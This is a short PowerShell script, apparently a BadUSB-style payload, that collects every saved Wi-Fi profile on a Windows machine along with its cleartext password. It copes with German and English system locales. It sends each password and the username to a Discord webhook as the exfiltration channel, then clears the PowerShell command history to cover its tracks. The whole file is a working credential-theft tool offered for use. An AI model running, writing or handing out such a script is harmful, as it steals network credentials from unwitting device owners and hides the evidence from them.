# Determine system language
$language = (Get-Culture).TwoLetterISOLanguageName

# Define strings based on language
switch ($language) {
    'de' { # German
        $userProfileString = '(?<=Profil für alle Benutzer\s+:\s).+'
        $keyContentString = '(?<=Schlüsselinhalt\s+:\s).+'
    }
    'en' { # English
        $userProfileString = '(?<=All User Profile\s+:\s).+'
        $keyContentString = '(?<=Key Content\s+:\s).+'
    }
    default { # Default to English if language is not supported
        $userProfileString = '(?<=All User Profile\s+:\s).+'
        $keyContentString = '(?<=Key Content\s+:\s).+'
    }
}

# Script to get WLAN profiles and passwords
netsh wlan show profile | Select-String $userProfileString | ForEach-Object {
    $wlan  = $_.Matches.Value
    $passw = netsh wlan show profile $wlan key=clear | Select-String $keyContentString

    $Body = @{
        'username' = $env:username + " | " + [string]$wlan
        'content' = [string]$passw
    }
    
    # Replace $discord with your Discord webhook URL
    Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
}

# Clear the PowerShell command history
Clear-History
